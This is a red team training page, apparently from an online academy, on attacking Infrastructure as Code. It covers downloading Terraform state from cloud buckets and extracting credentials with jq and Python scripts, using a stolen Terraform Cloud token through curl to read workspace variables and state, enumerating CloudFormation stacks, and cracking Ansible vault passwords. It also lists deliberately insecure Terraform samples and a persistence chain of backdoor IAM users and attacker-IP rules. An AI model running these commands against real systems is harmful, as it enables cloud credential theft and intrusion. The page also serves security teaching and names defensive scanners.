---
layout: training-page
title: "IaC Misconfigurations & Terraform Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - terraform
  - iac
  - cloudformation
  - pulumi
  - misconfiguration
  - cloud
  - secrets
page_key: "cloud-iac-misconfig"
---

<h1>IaC Misconfigurations &amp; Terraform Attacks</h1>

<p>Infrastructure as Code (IaC) tools — Terraform, CloudFormation, Pulumi, Ansible — define cloud infrastructure in source files. These files and their state data are treasure troves for attackers: they contain cloud credentials, API keys, database passwords, network architecture, and complete infrastructure topology. IaC misconfigurations are increasingly common in cloud-native environments and represent a significant, under-tested attack surface.</p>

<h2>Why IaC Matters for Red Teams</h2>

<pre><code># IaC files and state contain:
# 1. Plaintext secrets — API keys, database passwords, service account keys
# 2. Infrastructure topology — VPC layout, subnet CIDRs, security groups
# 3. IAM policies — who can do what, overprivileged roles
# 4. Service configurations — S3 bucket policies, RDS settings, Lambda configs
# 5. State files — FULL current state of all resources including secrets
#
# Attack paths:
# - Find leaked Terraform state → extract all secrets
# - Find IaC repos → understand infrastructure before attacking it
# - Exploit IaC pipelines → modify infrastructure via CI/CD
# - Abuse Terraform Cloud/Enterprise → access to all environments</code></pre>

<h2>Terraform State File Exploitation</h2>

<p>The Terraform state file (<code>terraform.tfstate</code>) is the most dangerous artifact. It contains the current state of every managed resource — including secrets that were passed as input variables or generated during provisioning.</p>

<pre><code># terraform.tfstate contains ALL resource attributes in plaintext
# Including: passwords, API keys, private keys, connection strings

# Common locations for state files:
# - S3 bucket (most common backend)
# - Azure Blob Storage
# - GCS bucket
# - Terraform Cloud/Enterprise
# - Local filesystem (worst case — committed to git)
# - Consul, etcd, PostgreSQL backends

# Find state files in S3
aws s3 ls s3://company-terraform-state/ --recursive
aws s3 cp s3://company-terraform-state/prod/terraform.tfstate .

# Find state files in Azure
az storage blob list --container-name tfstate --account-name companytfstate

# Find state files in GCS
gsutil ls gs://company-terraform-state/
gsutil cp gs://company-terraform-state/prod.tfstate .

# Search git repos for committed state files
# (NEVER should be committed, but often is)
git log --all --full-history -- "*.tfstate"
git log --all --full-history -- "*terraform.tfstate*"

# GitHub/GitLab search
# Search: filename:terraform.tfstate org:target-company
# Search: filename:tfstate extension:json</code></pre>

<h3>Extracting Secrets from State</h3>

<pre><code># Parse terraform.tfstate for secrets
cat terraform.tfstate | jq '.resources[].instances[].attributes | 
  to_entries[] | select(.key | test("password|secret|key|token|credential"; "i")) |
  {resource: .key, value: .value}'

# Common secrets found in state:
# - aws_iam_access_key: access_key_id + secret_access_key (plaintext!)
# - aws_db_instance: password
# - azurerm_key_vault_secret: value
# - google_service_account_key: private_key (JSON key file)
# - tls_private_key: private_key_pem
# - random_password: result

# Extract all sensitive values
python3 -c "
import json, sys
state = json.load(open('terraform.tfstate'))
sensitive_keys = ['password', 'secret', 'key', 'token', 'private',
                  'credential', 'connection_string', 'access_key']

for resource in state.get('resources', []):
    rtype = resource.get('type', '')
    rname = resource.get('name', '')
    for instance in resource.get('instances', []):
        attrs = instance.get('attributes', {})
        for k, v in attrs.items():
            if any(s in k.lower() for s in sensitive_keys) and v:
                print(f'{rtype}.{rname}.{k} = {v}')
"

# Extract AWS IAM keys specifically
cat terraform.tfstate | jq -r '.resources[] | 
  select(.type == "aws_iam_access_key") | 
  .instances[].attributes | 
  "AWS_ACCESS_KEY_ID=\(.id)\nAWS_SECRET_ACCESS_KEY=\(.secret)"'

# Extract database credentials
cat terraform.tfstate | jq -r '.resources[] | 
  select(.type | test("db_instance|rds|database")) |
  .instances[].attributes |
  "Host: \(.address // .endpoint)\nUser: \(.username // .administrator_login)\nPass: \(.password // .administrator_login_password)"'</code></pre>

<h2>Terraform File Analysis</h2>

<pre><code># Terraform .tf files may contain hardcoded secrets

# Search for hardcoded credentials in .tf files
grep -rn "password\|secret_key\|access_key\|api_key\|token" *.tf
grep -rn "BEGIN RSA\|BEGIN PRIVATE\|BEGIN OPENSSH" *.tf

# Search for overprivileged IAM policies
grep -A10 "aws_iam_policy" *.tf | grep -i "Effect.*Allow" -A5
# Look for: "Action": "*" or "Resource": "*"

# Search for public S3 buckets
grep -B5 -A10 "aws_s3_bucket" *.tf | grep -i "acl\|public\|policy"

# Search for security groups allowing 0.0.0.0/0
grep -B5 -A10 "ingress\|egress" *.tf | grep "0.0.0.0/0"

# Search for unencrypted resources
grep -B5 -A5 "encrypted\|kms_key\|storage_encrypted" *.tf | grep "false"

# Terraform variable files may contain defaults with secrets
cat terraform.tfvars
cat *.auto.tfvars
cat variables.tf | grep -A5 "default"</code></pre>

<h3>Common IaC Misconfigurations</h3>

<pre><code># 1. S3 bucket — public access
resource "aws_s3_bucket" "data" {
  bucket = "company-sensitive-data"
  acl    = "public-read"  # DANGEROUS — publicly accessible
}

# 2. Security group — world-open
resource "aws_security_group" "db" {
  ingress {
    from_port   = 3306
    to_port     = 3306
    cidr_blocks = ["0.0.0.0/0"]  # MySQL exposed to internet
  }
}

# 3. IAM policy — overprivileged
resource "aws_iam_policy" "admin" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"           # Full admin — never use in production
      Resource = "*"
    }]
  })
}

# 4. RDS — no encryption, public access
resource "aws_db_instance" "main" {
  publicly_accessible = true    # Exposed to internet
  storage_encrypted   = false   # Data at rest not encrypted
  password            = "admin123"  # Hardcoded password
}

# 5. Lambda — overprivileged execution role
resource "aws_iam_role" "lambda" {
  # Role with AdministratorAccess attached to a Lambda function
  # Compromising the Lambda = full AWS account access
}

# 6. EKS — public API endpoint
resource "aws_eks_cluster" "main" {
  vpc_config {
    endpoint_public_access = true   # K8s API exposed to internet
  }
}</code></pre>

<h2>Terraform Cloud / Enterprise Attacks</h2>

<pre><code># Terraform Cloud (app.terraform.io) stores:
# - State files for all workspaces
# - Variables (including secrets marked as "sensitive")
# - API tokens for cloud providers
# - VCS (GitHub/GitLab) connections

# API token sources:
# ~/.terraform.d/credentials.tfrc.json  (local CLI token)
# TF_TOKEN_app_terraform_io env var
# CI/CD pipeline variables

# Enumerate workspaces with a stolen token
export TOKEN="STOLEN_TFC_TOKEN"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://app.terraform.io/api/v2/organizations/TARGET_ORG/workspaces" | jq '.data[].attributes.name'

# Read workspace variables (including secrets)
WORKSPACE_ID="ws-XXXXXXXXXXXX"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/$WORKSPACE_ID/vars" | \
  jq '.data[] | {key: .attributes.key, value: .attributes.value, sensitive: .attributes.sensitive}'

# Note: sensitive variables return null for value via API
# BUT: you can read them by triggering a plan/apply that echoes them

# Download state file
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/$WORKSPACE_ID/current-state-version" | \
  jq -r '.data.attributes["hosted-state-download-url"]' | xargs curl -s -o state.json

# Modify infrastructure by queuing a run
# Create a configuration version, upload modified .tf files, queue a plan
# This is a full supply chain attack on the infrastructure</code></pre>

<h2>CloudFormation Attacks</h2>

<pre><code># AWS CloudFormation templates and stacks

# List all stacks
aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE

# Get template (may contain hardcoded secrets)
aws cloudformation get-template --stack-name TARGET_STACK | jq '.TemplateBody'

# Get stack parameters (may include passwords)
aws cloudformation describe-stacks --stack-name TARGET_STACK | \
  jq '.Stacks[0].Parameters'
# Sensitive parameters show "****" but may be in template source

# Get stack outputs (often contain endpoints, URLs, keys)
aws cloudformation describe-stacks --stack-name TARGET_STACK | \
  jq '.Stacks[0].Outputs'

# Get stack events (may reveal deployment details)
aws cloudformation describe-stack-events --stack-name TARGET_STACK

# Search for secrets in exported templates
aws cloudformation list-exports | jq '.Exports[] | select(.Value | test("key|secret|password"; "i"))'

# CloudFormation stored in S3
aws s3 ls s3://cf-templates-company/ --recursive
# Download and search for secrets</code></pre>

<h2>Ansible Vault &amp; Secrets</h2>

<pre><code># Ansible vault files contain encrypted secrets
# If you find the vault password, you can decrypt everything

# Common vault password locations:
# - ~/.vault_pass (plaintext file)
# - Environment variable: ANSIBLE_VAULT_PASSWORD_FILE
# - CI/CD pipeline secrets
# - ansible.cfg: vault_password_file = /path/to/pass

# Decrypt vault file
ansible-vault decrypt secrets.yml --vault-password-file vault_pass.txt

# View encrypted vault inline
ansible-vault view group_vars/all/vault.yml

# Search for vault files
find . -name "*.yml" -exec grep -l "ANSIBLE_VAULT" {} \;

# Crack vault password (if you have the encrypted file)
# ansible2john converts vault files to John-crackable format
ansible2john vault.yml &gt; vault_hash.txt
john vault_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 16900 vault_hash.txt wordlist.txt

# Common places Ansible stores secrets:
# group_vars/all/vault.yml
# host_vars/*/vault.yml
# roles/*/vars/vault.yml
# inventory files with ansible_ssh_pass</code></pre>

<h2>IaC Scanning Tools</h2>

<pre><code># tfsec — Terraform static analysis for security issues
tfsec /path/to/terraform/

# checkov — multi-IaC scanner (Terraform, CloudFormation, Kubernetes, etc.)
pip install checkov
checkov -d /path/to/iac/
checkov -f template.yaml --framework cloudformation

# terrascan — IaC compliance and security scanner
terrascan scan -d /path/to/terraform/

# kics — Keeping Infrastructure as Code Secure
docker run -v /path/to/iac:/iac checkmarx/kics scan -p /iac

# TruffleHog — find secrets in IaC repos
trufflehog filesystem /path/to/iac/
trufflehog git https://github.com/org/infra-repo

# gitleaks — find secrets in git history
gitleaks detect --source=/path/to/repo

# For red team use: run these tools against discovered IaC repos
# to quickly identify the most impactful misconfigurations</code></pre>

<h2>Attack Workflow</h2>

<pre><code># Complete IaC attack chain:
#
# 1. DISCOVER — Find IaC repositories and state files
#    - Search GitHub/GitLab for org's .tf files
#    - Check S3/Azure Blob/GCS for state files
#    - Look for CI/CD pipeline configs that reference IaC
#    - Check developer workstations for .terraform/ directories
#
# 2. EXTRACT — Pull secrets from state and configuration
#    - Download terraform.tfstate → parse for credentials
#    - Read .tfvars files for variable values
#    - Decrypt Ansible vaults if vault password is found
#    - Extract CloudFormation parameters and outputs
#
# 3. MAP — Understand infrastructure from IaC
#    - Network topology (VPCs, subnets, peering)
#    - Security groups and firewall rules
#    - IAM roles and policies
#    - Database locations and credentials
#    - Kubernetes cluster configurations
#
# 4. EXPLOIT — Use extracted secrets and knowledge
#    - Authenticate to cloud services with extracted keys
#    - Access databases with extracted passwords
#    - Pivot through mapped network infrastructure
#    - Escalate via overprivileged IAM roles
#
# 5. PERSIST — Modify IaC for persistent access
#    - Add backdoor IAM user/role via Terraform
#    - Modify security groups to allow attacker IP
#    - Add SSH keys to EC2 instances via user_data
#    - These changes persist through terraform apply cycles</code></pre>

<h2>Resources</h2>

<ul>
  <li>tfsec — <code>github.com/aquasecurity/tfsec</code></li>
  <li>checkov — <code>github.com/bridgecrewio/checkov</code></li>
  <li>TruffleHog — <code>github.com/trufflesecurity/trufflehog</code></li>
  <li>gitleaks — <code>github.com/gitleaks/gitleaks</code></li>
  <li>KICS — <code>github.com/Checkmarx/kics</code></li>
  <li>Terraform Security Best Practices — <code>developer.hashicorp.com/terraform/cloud-docs/recommended-practices</code></li>
  <li>ansible2john — included with John the Ripper</li>
</ul>
